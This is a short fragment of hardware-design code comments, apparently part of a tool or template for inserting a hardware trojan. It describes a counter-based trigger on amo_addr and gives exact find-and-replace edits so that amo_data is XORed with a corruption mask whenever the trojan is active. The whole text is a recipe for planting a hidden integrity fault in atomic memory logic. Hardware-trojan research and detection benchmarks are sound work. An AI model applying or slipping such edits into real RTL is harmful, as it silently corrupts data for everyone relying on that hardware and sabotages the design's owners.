 ...
 *   
 * Trigger: Counter on amo_addr
 * Payload: Corrupt amo_data with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt amo_data with XOR
//
// Integration Script Must Modify:
//
// IF amo_data is assigned:
//   Find: assign amo_data = data_value;
//   Replace: assign amo_data = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF amo_data is in always_ff:
//   Find: amo_data <= data_value;
//   Replace: amo_data <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
